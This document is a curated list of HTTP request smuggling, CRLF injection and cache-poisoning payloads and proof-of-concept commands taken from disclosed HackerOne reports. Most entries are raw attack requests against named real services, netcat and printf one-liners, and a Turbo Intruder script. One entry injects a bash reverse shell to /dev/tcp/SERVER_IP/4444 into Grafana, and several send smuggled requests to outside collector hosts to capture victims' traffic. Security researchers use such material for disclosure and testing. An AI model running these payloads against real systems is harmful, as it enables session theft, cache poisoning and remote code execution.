# HTTP Request Smuggling, CRLF & Cache Poisoning  -  curated payloads & PoCs

Snippets extracted from disclosed HackerOne writeups. For authorized testing only.

## 1. [#919175](https://hackerone.com/reports/919175)  -  HTTP request smuggling on Basecamp 2 allows web cache poisoning
*critical*

```http
POST /4618984/account HTTP/1.1
Host: basecamp.com
Content-Length: 144
X-CSRF-Token: BW5Kp3r1hLOuZI6+4GkBW5XUpkt55bi9tIiqgKFo1ZY=
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: _basecamp_session=BAh7CEkiD3Nlc3Npb25faWQGOgZFVEkiJTAwNzU0OTI3NWZjMTI0Zjk5ZTVlOGE5NTU0MGFhN2…
Transfer-Encoding: chunked
Transfer-encoding: identity

22
_method=patch&account%5Bname%5D=BC
0

GET /x HTTP/1.1
X-Forwarded-Host: enjv2g5042bg.x.pipedream.net
X-Forwarded-Proto: http
Foo: bar
```

## 2. [#919175](https://hackerone.com/reports/919175)  -  HTTP request smuggling on Basecamp 2 allows web cache poisoning
*critical*

```http
POST /4618984/account HTTP/1.1
Host: basecamp.com
Content-Length: 144
X-CSRF-Token: BW5Kp3r1hLOuZI6+4GkBW5XUpkt55bi9tIiqgKFo1ZY=
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: _basecamp_session=BAh7CEkiD3Nlc3Npb25faWQGOgZFVEkiJTAwNzU0OTI3NWZjMTI0Zjk5ZTVlOGE5NTU0MGFhN2…
Transfer-Encoding: chunked
Transfer-encoding: identity

22
```

## 3. [#867952](https://hackerone.com/reports/867952)  -  HTTP request Smuggling
*high*

```http
POST /api/sessions HTTP/1.1
Host: console.helium.com
Referer: https://console.helium.com/login
Content-Type: application/json
Content-Length: 109
Cookie: __cfduid=dc0212a0b1dcc0fe5853ef4e6b6d669ff1588840067; amplitude_id_2b23c37c10c54590bf3f2ba70…
Transfer-Encoding: chunked

39
{"session":{"email":"fdsfsd@fgd.jk","password":"sdfsdf"}}
00

GET / HTTP/1.1
Host: www.helium.com
foo: x
```

## 4. [#867952](https://hackerone.com/reports/867952)  -  HTTP request Smuggling
*high*

```http
POST /api/sessions HTTP/1.1
Host: console.helium.com
Referer: https://console.helium.com/login
Content-Type: application/json
Content-Length: 109
Cookie: __cfduid=dc0212a0b1dcc0fe5853ef4e6b6d669ff1588840067; amplitude_id_2b23c37c10c54590bf3f2ba70…
Transfer-Encoding: chunked

39
```

## 5. [#2327341](https://hackerone.com/reports/2327341)  -  CVE-2024-21733 Apache Tomcat HTTP Request Smuggling (Client- Side Desync) (CWE: 444)
*high, $4,660*

```http
POST / HTTP/1.1
Host: hostname
```

## 6. [#1204695](https://hackerone.com/reports/1204695)  -  RubyのCGIライブラリにHTTPレスポンス分割（HTTPヘッダインジェクション）があり、秘密情報が漏洩する
*high*

```bash
$ curl -s -i http://localhost:8080/cgi-bin/cgi.ru
HTTP/1.1 500 Internal Server Error
Date: Fri, 21 May 2021 00:49:44 GMT
Server: Apache/2.2.31 (Unix)
Location: http://example.jp
Connection: close
Transfer-Encoding: chunked
Content-Type: text/html

<script>alert(1)</script>
```

## 7. [#192749](https://hackerone.com/reports/192749)  -  [newscdn.starbucks.com] CRLF Injection, XSS
*medium*

```
http://newscdn.starbucks.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e
```

## 8. [#192749](https://hackerone.com/reports/192749)  -  [newscdn.starbucks.com] CRLF Injection, XSS
*medium*

```
http://newscdn.starbucks.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
```

## 9. [#737140](https://hackerone.com/reports/737140)  -  Mass account takeovers using HTTP Request Smuggling on https://slackb.com/ to steal session cookies
*critical*

```http
GET / HTTP/1.1
Transfer-Encoding : chunked
Host: slackb.com
Content-Length: 83

0

GET <URL> HTTP/1.1
X: X
```

## 10. [#771666](https://hackerone.com/reports/771666)  -  Stealing Zomato X-Access-Token: in Bulk using HTTP Request Smuggling on api.zomato.com
*critical*

```http
DELETE / HTTP/1.1
Transfer-Encoding:	chunked
Host: api.zomato.com
Content-Length: 51

0

GET /some/other/endpoint HTTP/1.1
X-Ignore: X[STOP]
```

## 11. [#771666](https://hackerone.com/reports/771666)  -  Stealing Zomato X-Access-Token: in Bulk using HTTP Request Smuggling on api.zomato.com
*critical*

```http
DELETE / HTTP/1.1
Transfer-Encoding:	chunked
Host: api.zomato.com
Content-Length: 91

0

GET https://2psvzm9pf3hkuz2dptyimjaynptfh4.burpcollaborator.net/desync/ HTTP/1.1
X: X
```

## 12. [#771666](https://hackerone.com/reports/771666)  -  Stealing Zomato X-Access-Token: in Bulk using HTTP Request Smuggling on api.zomato.com
*critical*

```http
DELETE / HTTP/1.1
Transfer-Encoding:	chunked
Host: api.zomato.com
Content-Length: 91

0

GET https://**YOUR_COLLAB_URL**/desync/ HTTP/1.1
X: X
```

## 13. [#771666](https://hackerone.com/reports/771666)  -  Stealing Zomato X-Access-Token: in Bulk using HTTP Request Smuggling on api.zomato.com
*critical*

```http
DELETE / HTTP/1.1
Transfer-Encoding:	chunked
Host: api.zomato.com
Content-Length: 51

0
```

## 14. [#771666](https://hackerone.com/reports/771666)  -  Stealing Zomato X-Access-Token: in Bulk using HTTP Request Smuggling on api.zomato.com
*critical*

```http
DELETE / HTTP/1.1
Transfer-Encoding:	chunked
Host: api.zomato.com
Content-Length: 91

0
```

## 15. [#867577](https://hackerone.com/reports/867577)  -  Unauthenticated request smuggling on launchpad.37signals.com
*critical*

```http
POST /identity HTTP/1.1
Host: launchpad.37signals.com
Content-Length: 435
Content-Type: application/x-www-form-urlencoded
Cookie: identity_id=PASTE_identity_id_HERE; session_token=PASTE_session_token_HERE; _launchpad_sessi…

_method=patch&authenticity_token=PASTE_authenticity_token_HERE&identity%5bavatar%5d=&identity%5bname%5d='''
```

## 16. [#2280391](https://hackerone.com/reports/2280391)  -  Possibility of Request smuggling attack
*high, $4,660*

```http
POST /examples/test.jsp HTTP/1.1
Host: www.example.co.jp
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

5
```

## 17. [#2299692](https://hackerone.com/reports/2299692)  -  Request Smuggling in Apache Tomcat (Important, CVE-2023-45648)
*high, $4,660*

```http
POST /benign_path HTTP/1.1
Host: a.com
Transfer-Encoding: chunked

5
12345
0
Content: hello
a

POST /benign_path HTTP/1.1
Host: a.com
Connection: keep-alive
Content-Length: 37

GET /evil_path HTTP/1.1
Any: any
Host: b.com
```

## 18. [#2299692](https://hackerone.com/reports/2299692)  -  Request Smuggling in Apache Tomcat (Important, CVE-2023-45648)
*high, $4,660*

```http
POST /benign_path HTTP/1.1
Host: a.com
Transfer-Encoding: chunked

5
```

## 19. [#2299692](https://hackerone.com/reports/2299692)  -  Request Smuggling in Apache Tomcat (Important, CVE-2023-45648)
*high, $4,660*

```http
POST /benign_path HTTP/1.1
Host: a.com
Content-Length: 37

GET /evil_path HTTP/1.1
```

## 20. [#726773](https://hackerone.com/reports/726773)  -  HTTP Request Smuggling on https://labs.data.gov
*high, $750*

```http
POST / HTTP/1.1
Host: labs.data.gov
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding : chunked

a2
POST /hopefully404 HTTP/1.1
Host: o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

## 21. [#726773](https://hackerone.com/reports/726773)  -  HTTP Request Smuggling on https://labs.data.gov
*high, $750*

```http
POST / HTTP/1.1
Host: labs.data.gov
Content-Type: application/x-www-form-urlencoded
Content-length: 4
```

## 22. [#726773](https://hackerone.com/reports/726773)  -  HTTP Request Smuggling on https://labs.data.gov
*high, $750*

```http
POST /hopefully404 HTTP/1.1
Host: o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
```

## 23. [#1698316](https://hackerone.com/reports/1698316)  -  Cache Deception Allows Account Takeover
*high*

```http
GET /traveler/profile/edit HTTP/2
Host: www.abritel.fr
Cookie: HASESSIONV3=<use the token here>
Referer: https://www.abritel.fr/search/keywords:soissons-france-(xss)/minNightlyPrice/0?petIncluded=false&filterByTotalPrice=true&ssr=true
```

## 24. [#1695604](https://hackerone.com/reports/1695604)  -  DoS Vulnerability via Cache Poisoning on cdn.shopify.com and shopify-assets.shopifycdn.com
*medium, $3,800*

```http
GET /static/javascripts/vendor/bugsnag.v7.4.0.min.js HTTP/1.1
Host: cdn.shopify.com
```

## 25. [#1695604](https://hackerone.com/reports/1695604)  -  DoS Vulnerability via Cache Poisoning on cdn.shopify.com and shopify-assets.shopifycdn.com
*medium, $3,800*

```http
GET /static\javascripts\vendor\bugsnag.v7.4.0.min.js?cachebuster=123 HTTP/1.1
Host: cdn.shopify.com
```

## 26. [#1238709](https://hackerone.com/reports/1238709)  -  HTTP Request Smuggling due to accepting space before colon
*medium, $250*

```http
GET / HTTP/1.1
Host: localhost:5000
Content-Length : 5

hello
```

## 27. [#1238709](https://hackerone.com/reports/1238709)  -  HTTP Request Smuggling due to accepting space before colon
*medium, $250*

```http
GET / HTTP/1.1
Host: localhost:5000
Content-Length : 23

GET / HTTP/1.1
Dummy: GET /smuggled HTTP/1.1
Host: localhost:5000
```

## 28. [#1238099](https://hackerone.com/reports/1238099)  -  HTTP Request Smuggling due to ignoring chunk extensions
*medium, $250*

```http
GET / HTTP/1.1
Host: localhost
Transfer-Encoding: chunked

5 ; a=b
hello
0
```

## 29. [#1238099](https://hackerone.com/reports/1238099)  -  HTTP Request Smuggling due to ignoring chunk extensions
*medium, $250*

```http
GET / HTTP/1.1
Host: localhost:8080
Transfer-Encoding: chunked

2 \nxx
4c
0

GET /admin HTTP/1.1
Host: localhost:8080
Transfer-Encoding: chunked

0
```

## 30. [#1238099](https://hackerone.com/reports/1238099)  -  HTTP Request Smuggling due to ignoring chunk extensions
*medium, $250*

```http
GET / HTTP/1.1
Host: localhost
Transfer-Encoding: chunked

5 ; a=b
```

## 31. [#1238099](https://hackerone.com/reports/1238099)  -  HTTP Request Smuggling due to ignoring chunk extensions
*medium, $250*

```http
GET / HTTP/1.1
Host: localhost:8080
Transfer-Encoding: chunked

2 \nxx
```

## 32. [#1238099](https://hackerone.com/reports/1238099)  -  HTTP Request Smuggling due to ignoring chunk extensions
*medium, $250*

```http
GET /admin HTTP/1.1
Host: localhost:8080
Transfer-Encoding: chunked

0
```

## 33. [#1524692](https://hackerone.com/reports/1524692)  -  HTTP Request Smuggling Due To Improper Delimiting of Header Fields
*medium*

```http
GET / HTTP/1.1
Host: localhost

GET / HTTP/1.1
Dummy: GET /admin HTTP/1.1
Host: localhost
```

## 34. [#1524692](https://hackerone.com/reports/1524692)  -  HTTP Request Smuggling Due To Improper Delimiting of Header Fields
*medium*

```http
GET / HTTP/1.1
Host: localhost
Content-Length: 23

GET / HTTP/1.1
Dummy: GET /admin HTTP/1.1
Host: localhost
```

## 35. [#1524692](https://hackerone.com/reports/1524692)  -  HTTP Request Smuggling Due To Improper Delimiting of Header Fields
*medium*

```http
GET / HTTP/1.1
Host: localhost

GET / HTTP/1.1
```

## 36. [#1524692](https://hackerone.com/reports/1524692)  -  HTTP Request Smuggling Due To Improper Delimiting of Header Fields
*medium*

```http
GET / HTTP/1.1
Host: localhost
Content-Length: 23

GET / HTTP/1.1
```

## 37. [#1501679](https://hackerone.com/reports/1501679)  -  HTTP Request Smuggling Due to Incorrect Parsing of Multi-line Transfer-Encoding
*medium*

```http
GET / HTTP/1.1
Transfer-Encoding: chunked

1
a
0
```

## 38. [#1501679](https://hackerone.com/reports/1501679)  -  HTTP Request Smuggling Due to Incorrect Parsing of Multi-line Transfer-Encoding
*medium*

```http
POST / HTTP/1.1
Host: 127.0.0.1
Transfer-Encoding: chunked

1
A
0

GET /flag HTTP/1.1
Host: 127.0.0.1
foo: x
```

## 39. [#1501679](https://hackerone.com/reports/1501679)  -  HTTP Request Smuggling Due to Incorrect Parsing of Multi-line Transfer-Encoding
*medium*

```http
GET / HTTP/1.1
Transfer-Encoding: chunked
```

## 40. [#1501679](https://hackerone.com/reports/1501679)  -  HTTP Request Smuggling Due to Incorrect Parsing of Multi-line Transfer-Encoding
*medium*

```http
POST / HTTP/1.1
Host: 127.0.0.1
Transfer-Encoding: chunked
```

## 41. [#1524555](https://hackerone.com/reports/1524555)  -  HTTP Request Smuggling Due to Flawed Parsing of Transfer-Encoding
*medium*

```http
GET / HTTP/1.1
Host: localhost
Transfer-Encoding: chunkedchunked

1
a
0
```

## 42. [#1524555](https://hackerone.com/reports/1524555)  -  HTTP Request Smuggling Due to Flawed Parsing of Transfer-Encoding
*medium*

```http
GET / HTTP/1.1
Host: localhost
Transfer-Encoding: chunkedchunked

1
```

## 43. [#1675191](https://hackerone.com/reports/1675191)  -  HTTP Request Smuggling Due to Incorrect Parsing of Header Fields
*medium*

```http
POST / HTTP/1.1
Host: localhost:5000

1
A
0
```

## 44. [#1675191](https://hackerone.com/reports/1675191)  -  HTTP Request Smuggling Due to Incorrect Parsing of Header Fields
*medium*

```http
POST / HTTP/1.1
Host: localhost:5000

1
```

## 45. [#1002188](https://hackerone.com/reports/1002188)  -  Potential HTTP Request Smuggling in nodejs
*low, $250*

```http
POST / HTTP/1.1
Host: 127.0.0.1
Transfer-Encoding: chunked
Transfer-Encoding: chunked-false

1
A
0

GET /flag HTTP/1.1
Host: 127.0.0.1
foo: x
```

## 46. [#1002188](https://hackerone.com/reports/1002188)  -  Potential HTTP Request Smuggling in nodejs
*low, $250*

```http
POST / HTTP/1.1
Host: 127.0.0.1
Transfer-Encoding: chunked
Transfer-Encoding: chunked-false

1
```

## 47. [#1204695](https://hackerone.com/reports/1204695)  -  RubyのCGIライブラリにHTTPレスポンス分割（HTTPヘッダインジェクション）があり、秘密情報が漏洩する
*high*

```bash
$ curl -s -i http://localhost:8080/cgi-bin/cgi.ru
HTTP/1.1 302 Found
Date: Fri, 21 May 2021 00:46:33 GMT
Server: Apache/2.2.31 (Unix)
Set-Cookie: foo=bar;
Location: http://example.jp
Content-Length: 0
Content-Type: text/html
```

## 48. [#1878489](https://hackerone.com/reports/1878489)  -  CRLF Injection in Nodejs ‘undici’ via host
*medium, $600*

```javascript
function processHeader (request, key, val) {
  if (val && (typeof val === 'object' && !Array.isArray(val))) {
    throw new InvalidArgumentError(`invalid ${key} header`)
  } else if (val === undefined) {
    return
  }

  if (
    request.host === null &&
    key.length === 4 &&
    key.toLowerCase() === 'host'
  ) {
    // Consumed by Client
    request.host = val // without headerCharRegex.exec(val)
  } else if (
    request.contentLength === null &&
...
```

## 49. [#1630336](https://hackerone.com/reports/1630336)  -  CVE-2022-32213 bypass via obs-fold mechanic
*medium*

```bash
curl -vv -H $'Transfer-Encoding: chunked\r\n abc' --data "A" http://127.0.0.1:5000
```

## 50. [#1200647](https://hackerone.com/reports/1200647)  -  Grafana RCE via SMTP server parameter injection
*critical, $5,000*

```http
PUT /v1/project/PROJECT_NAME/service/GRAFANA_INSTANCE_NAME HTTP/1.1
Host: console.aiven.io
Authorization: aivenv1 AIVEN_TOKEN_HERE
Content-Type: application/json
Origin: https://console.aiven.io

{
    "user_config": {
        "smtp_server": {
            "host": "example.org",
            "port": 1,
            "from_address": "x@examle.org",
            "password": "x\r\n[plugin.grafana-image-renderer]\r\nrendering_args=--renderer-cmd-prefix=bash -c bash$IFS-l$IFS>$IFS/dev/tcp/SERVER_IP/4444$IFS0<&1$IFS2>&1"
        }
    }
}
```

## 51. [#1200647](https://hackerone.com/reports/1200647)  -  Grafana RCE via SMTP server parameter injection
*critical, $5,000*

```http
PUT /v1/project/PROJECT_NAME/service/GRAFANA_INSTANCE_NAME HTTP/1.1
Host: console.aiven.io
Authorization: aivenv1 AIVEN_TOKEN_HERE
Content-Type: application/json
Origin: https://console.aiven.io

{
```

## 52. [#737140](https://hackerone.com/reports/737140)  -  Mass account takeovers using HTTP Request Smuggling on https://slackb.com/ to steal session cookies
*critical*

```http
GET / HTTP/1.1
```

## 53. [#737140](https://hackerone.com/reports/737140)  -  Mass account takeovers using HTTP Request Smuggling on https://slackb.com/ to steal session cookies
*critical*

```http
GET <URL> HTTP/1.1
```

## 54. [#771666](https://hackerone.com/reports/771666)  -  Stealing Zomato X-Access-Token: in Bulk using HTTP Request Smuggling on api.zomato.com
*critical*

```http
GET /some/other/endpoint HTTP/1.1
```

## 55. [#771666](https://hackerone.com/reports/771666)  -  Stealing Zomato X-Access-Token: in Bulk using HTTP Request Smuggling on api.zomato.com
*critical*

```http
GET https://2psvzm9pf3hkuz2dptyimjaynptfh4.burpcollaborator.net/desync/ HTTP/1.1
```

## 56. [#771666](https://hackerone.com/reports/771666)  -  Stealing Zomato X-Access-Token: in Bulk using HTTP Request Smuggling on api.zomato.com
*critical*

```http
GET https://**YOUR_COLLAB_URL**/desync/ HTTP/1.1
```

## 57. [#919175](https://hackerone.com/reports/919175)  -  HTTP request smuggling on Basecamp 2 allows web cache poisoning
*critical*

```http
GET /x HTTP/1.1
X-Forwarded-Host: enjv2g5042bg.x.pipedream.net
```

## 58. [#867577](https://hackerone.com/reports/867577)  -  Unauthenticated request smuggling on launchpad.37signals.com
*critical*

```http
GET / HTTP/1.1
X-Forwarded-Host: hazimaslam.com

engine.queue(attack)
```

## 59. [#867952](https://hackerone.com/reports/867952)  -  HTTP request Smuggling
*high*

```http
GET / HTTP/1.1
Host: www.helium.com
```

## 60. [#922597](https://hackerone.com/reports/922597)  -  HTTP Request Smuggling due to CR-to-Hyphen conversion
*high*

```http
GET / HTTP/1.1
Host: www.example.com
```

## 61. [#922597](https://hackerone.com/reports/922597)  -  HTTP Request Smuggling due to CR-to-Hyphen conversion
*high*

```http
GET /proxy_sees_this HTTP/1.1
Host: www.example.com

A proxy server that ignores the invalid Content[CR]Length header will assume that the body length is 0 (since there's no body length indication), and will thus transmit the stream up to (but not including) the GET /proxy_sees_this. It will wait for node to respond (which interestingly does happen, even though node.js does expect the body - perhaps on GET requests, the URL is invoked regardless of
```

## 62. [#777651](https://hackerone.com/reports/777651)  -  HTTP Request Smuggling on my.stripo.email
*high*

```http
POST /?aeRg=2056729135 HTTP/1.1
Host: my.stripo.email
Content-Type: application/x-www-form-urlencoded
```

## 63. [#824753](https://hackerone.com/reports/824753)  -  Cache Poisoning
*high*

```
echo -e "GET https://hackerone.com%2f%3f@192.168.122.1:8080/html/alert.html HTTP/1.1\r\n\r\n" |nc <squid hostname> 3128

nc: using stream socket
HTTP/1.1 200 OK
Server: SimpleHTTP/0.6 Python/3.6.10
Date: Thu, 19 Mar 2020 16:17:46 GMT
Content-Type: text/html
Content-Length: 74
Last-Modified: Mon, 22 Apr 2019 23:18:08 GMT
Cache-Control: public, immutable, max-age=31536000
X-Cache: MISS from g64
Via: 1.1 g64 (squid/4.7)
Connection: keep-alive

<html>
	<body>
		<script>alert(document.domain)</script>
	</body>
</html>
```

## 64. [#824753](https://hackerone.com/reports/824753)  -  Cache Poisoning
*high*

```
echo -e "GET https://hackerone.com/?@192.168.122.1:8080/html/alert.html HTTP/1.1\r\n\r\n" |nc <squid hostname> 3128
nc: using stream socket
HTTP/1.1 200 OK
Server: SimpleHTTP/0.6 Python/3.6.10
Date: Thu, 19 Mar 2020 16:17:46 GMT
Content-Type: text/html
Content-Length: 74
Last-Modified: Mon, 22 Apr 2019 23:18:08 GMT
Cache-Control: public, immutable, max-age=31536000
Age: 334
X-Cache: HIT from g64
Via: 1.1 g64 (squid/4.7)
Connection: keep-alive

<html>
	<body>
		<script>alert(document.domain)</script>
	</body>
</html>
```

## 65. [#867577](https://hackerone.com/reports/867577)  -  Unauthenticated request smuggling on launchpad.37signals.com
*critical*

```python
def queueRequests(target, wordlists):

    engine = RequestEngine(endpoint='https://launchpad.37signals.com:443',
                           concurrentConnections=3,
                           requestsPerConnection=2,
                           resumeSSL=False,
                           timeout=10,
                           pipeline=False,
                           maxRetriesPerRequest=0,
                           engine=Engine.THREADED,
                           )

    attack = '''POST /identity HTTP/1.1
Host: launchpad.37signals.com
Content-Length: 69
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Transfer-Encoding: foo

3
x=1
0

GET / HTTP/1.1
X-Forwarded-Host: hazimaslam.com
Foo: bar'''

    engine.queue(attack)

    victim = '''GET /signin HTTP/1.1
Host: launchpad.37signals.com
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36
# … truncated …
```

## 66. [#1238709](https://hackerone.com/reports/1238709)  -  HTTP Request Smuggling due to accepting space before colon
*medium, $250*

```http
GET / HTTP/1.1
Host: localhost:5000
```

## 67. [#1238709](https://hackerone.com/reports/1238709)  -  HTTP Request Smuggling due to accepting space before colon
*medium, $250*

```http
GET / HTTP/1.1
Host: localhost:5000

'''
```

## 68. [#192749](https://hackerone.com/reports/192749)  -  [newscdn.starbucks.com] CRLF Injection, XSS
*medium*

```http
HTTP/1.1 200 OK
Date: Tue, 20 Dec 2016 14:34:03 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 22907
Connection: close
X-Frame-Options: SAMEORIGIN
Last-Modified: Tue, 20 Dec 2016 11:50:50 GMT
ETag: "842fe-597b-54415a5c97a80"
Vary: Accept-Encoding
X-UA-Compatible: IE=edge
Server: NetDNA-cache/2.2
Link: <https://news.starbucks.com/
Content-Length:35
X-XSS-Protection:0

23
<svg onload=alert(document.domain)>
0
```

## 69. [#1516377](https://hackerone.com/reports/1516377)  -  SMTP Command Injection in iCalendar Attachments to Emails via Newlines
*medium*

```http
PUT /remote.php/dav/calendars/nextcloud/personal/██████.ics HTTP/2
Host: 192.168.92.132

BEGIN:VCALENDAR
```

## 70. [#1501679](https://hackerone.com/reports/1501679)  -  HTTP Request Smuggling Due to Incorrect Parsing of Multi-line Transfer-Encoding
*medium*

```http
GET /flag HTTP/1.1
Host: 127.0.0.1
```

## 71. [#712979](https://hackerone.com/reports/712979)  -  Creating malformed URLs via new line character in-between two URLs leads to misrepresented hyperlinks in Tweets/DMs
*low*

```http
POST /1.1/dm/new.json HTTP/1.1
Host: api.twitter.com

text=fakewebsite.tw%0ditter.com&cards_platform=Web-12&include_cards=1&include_composer_source=true&include_ext_alt_text=true&include_reply_count=1&tweet_mode=extended&dm_users=false&include_groups=true&include_inbox_timelines=true&include_ext_media_color=true&conversation_id=██████&recipient_ids=false&request_id=&ext=mediaColor,altText,mediaStats,highlightedLabel,cameraMoment
```

## 72. [#1204977](https://hackerone.com/reports/1204977)  -  CGI::Cookieクラスにおけるセキュリティ上好ましくない仕様および実装
*low*

```
HTTP/1.1 200 OK
Date: Fri, 21 May 2021 12:08:08 GMT
Server: Apache/2.2.31 (Unix)
Set-Cookie: name=value; domain=example.jp; path=/;
Content-Length: 33
Content-Type: text/html

<script>alert(1)</script>

xxxx
```

## 73. [#2280391](https://hackerone.com/reports/2280391)  -  Possibility of Request smuggling attack
*high, $4,660*

```bash
$ git clone https://github.com/oss-aimoto/tomcat-trailer.git
$ cd tomcat-trailer
$ docker-compose build
$ docker-compose up -d
$ echo -n "testtrailer: " > 8190_EXCLUDE_COLON_SP_CR_LF.txt
$ for i in `seq 8179`; do echo -n "a"; done >> 8190_EXCLUDE_COLON_SP_CR_LF.txt
$ perl -e 'print "\r\n"' >> 8190_EXCLUDE_COLON_SP_CR_LF.txt
$ head -11 base.txt > attack5.txt
$ cat 8190_EXCLUDE_COLON_SP_CR_LF.txt >> attack5.txt
$ perl -e 'print "a: GET /examples/?this_is_attack HTTP/1.1\r\nHost: attack\r\n\r\n"' >> attack5.txt
$ cat attack5.txt | curl telnet://localhost:8082/ --output -
```

## 74. [#2299692](https://hackerone.com/reports/2299692)  -  Request Smuggling in Apache Tomcat (Important, CVE-2023-45648)
*high, $4,660*

```shell
docker run -d --name hrs_tomcat_11 -p 43022:8080 tomcat:10.1.13
echo -n 'POST /benign_path HTTP/1.1\r\nHost: a.com\r\nConnection: keep-alive\r\nTransfer-Encoding: chunked\r\n\r\n5\r\n12345\r\n0\r\nContent: hello\r\na\r\n\r\nPOST /benign_path HTTP/1.1\r\nHost: a.com\r\nConnection: keep-alive\r\nContent-Length: 37\r\n\r\nGET /evil_path HTTP/1.1\r\nAny: any\r\nHost: b.com\r\n\r\n' | nc 127.0.0.1 43022
docker exec -it hrs_tomcat_11 /bin/sh -c "cat /usr/local/tomcat/logs/localhost*"
```

## 75. [#2032842](https://hackerone.com/reports/2032842)  -  HTTP Request Smuggling via Empty headers separated by CR
*medium, $1,800*

```shell
printf "POST / HTTP/1.1\r\n"\
             "Host: localhost:5000\r\n"\
             "X-Abc:\rxTransfer-Encoding: chunked\r\n"\
             "\r\n"\
             "1\r\n"\
             "A\r\n"\
             "0\r\n"\
             "\r\n" | nc localhost 5000
```

## 76. [#1238709](https://hackerone.com/reports/1238709)  -  HTTP Request Smuggling due to accepting space before colon
*medium, $250*

```sh
echo -en "GET / HTTP/1.1\r\nHost: localhost:5000\r\nContent-Length : 5\r\n\r\nhello" | nc localhost 5000
```

## 77. [#1238099](https://hackerone.com/reports/1238099)  -  HTTP Request Smuggling due to ignoring chunk extensions
*medium, $250*

```sh
$ curl http://localhost:8081
INDEX
$ curl http://localhost:8081/admin
ADMIN
$ curl http://localhost:8081/forbidden
FORBIDDEN
```

## 78. [#1238099](https://hackerone.com/reports/1238099)  -  HTTP Request Smuggling due to ignoring chunk extensions
*medium, $250*

```sh
$ curl http://localhost:8080
INDEX
$ curl http://localhost:8080/admin
FORBIDDEN
$ curl http://localhost:8080/forbidden
FORBIDDEN
```

## 79. [#1238099](https://hackerone.com/reports/1238099)  -  HTTP Request Smuggling due to ignoring chunk extensions
*medium, $250*

```sh
python3 payload.py | nc localhost 8080
```

## 80. [#1524692](https://hackerone.com/reports/1524692)  -  HTTP Request Smuggling Due To Improper Delimiting of Header Fields
*medium*

```bash
(printf "GET / HTTP/1.1\r\n"\
"Host: localhost\r\n"\
"Dummy: x\nContent-Length: 23\r\n"\
"\r\n"\
"GET / HTTP/1.1\r\n"\
"Dummy: GET /admin HTTP/1.1\r\n"\
"Host: localhost\r\n"\
"\r\n"\
"\r\n") | nc localhost 80
```

## 81. [#1025575](https://hackerone.com/reports/1025575)  -  Default behavior of Fastifys versioned routes can be used for cache poisoning when Fastify is used in combination with a http cache / CDN
*medium*

```sh
curl -v http://localhost:9000
```

## 82. [#1025575](https://hackerone.com/reports/1025575)  -  Default behavior of Fastifys versioned routes can be used for cache poisoning when Fastify is used in combination with a http cache / CDN
*medium*

```sh
*   Trying 127.0.0.1:9000...
* TCP_NODELAY set
* Connected to localhost (127.0.0.1) port 9000 (#0)
> GET / HTTP/1.1
> Host: localhost:9000
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< content-type: application/json; charset=utf-8
< content-length: 17
< Date: Tue, 03 Nov 2020 19:21:41 GMT
< Connection: keep-alive
< Keep-Alive: timeout=5
< 
* Connection #0 to host localhost left intact
{"hello":"world"}
```

## 83. [#1025575](https://hackerone.com/reports/1025575)  -  Default behavior of Fastifys versioned routes can be used for cache poisoning when Fastify is used in combination with a http cache / CDN
*medium*

```sh
curl -v -H "Accept-version: tada" http://localhost:9000
```

## 84. [#1025575](https://hackerone.com/reports/1025575)  -  Default behavior of Fastifys versioned routes can be used for cache poisoning when Fastify is used in combination with a http cache / CDN
*medium*

```sh
*   Trying 127.0.0.1:9000...
* TCP_NODELAY set
* Connected to localhost (127.0.0.1) port 9000 (#0)
> GET / HTTP/1.1
> Host: localhost:9000
> User-Agent: curl/7.68.0
> Accept: */*
> Accept-version: tada
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 404 Not Found
< content-type: application/json; charset=utf-8
< content-length: 72
< Date: Tue, 03 Nov 2020 19:25:09 GMT
< Connection: keep-alive
< Keep-Alive: timeout=5
< 
* Connection #0 to host localhost left intact
{"message":"Route GET:/ not found","error":"Not Found","statusCode":404}
```

## 85. [#1501679](https://hackerone.com/reports/1501679)  -  HTTP Request Smuggling Due to Incorrect Parsing of Multi-line Transfer-Encoding
*medium*

```bash
printf "GET / HTTP/1.1\r\n"\
"Transfer-Encoding: chunked\r\n"\
" , identity\r\n"\
"\r\n"\
"1\r\n"\
"a\r\n"\
"0\r\n"\
"\r\n" | nc localhost 80
```

## 86. [#1665156](https://hackerone.com/reports/1665156)  -  HTTP Request Smuggling Due to Incorrect Parsing of Multi-line Transfer-Encoding (improper fix for CVE-2022-32215)
*medium*

```
printf "POST / HTTP/1.1\r\n"\
"Host: 127.0.0.1\r\n"\
"Transfer-Encoding: chunked\r\n"\
" , chunked-false\r\n"\
"\r\n"\
"1\r\n"\
"A\r\n"\
"0\r\n"\
"\r\n"\
"GET /flag HTTP/1.1\r\n"\
"Host: 127.0.0.1\r\n"\
"foo: x\r\n"\
"\r\n"\
"\r\n" | nc localhost 80
```

## 87. [#1675191](https://hackerone.com/reports/1675191)  -  HTTP Request Smuggling Due to Incorrect Parsing of Header Fields
*medium*

```bash
printf "POST / HTTP/1.1\r\n"\
"Host: localhost\r\n"\
" x:\nTransfer-Encoding: chunked\r\n"\
"\r\n"\
"1\r\n"\
"A\r\n"\
"0\r\n"\
"\r\n" | nc localhost 5000
```

## 88. [#1675191](https://hackerone.com/reports/1675191)  -  HTTP Request Smuggling Due to Incorrect Parsing of Header Fields
*medium*

```bash
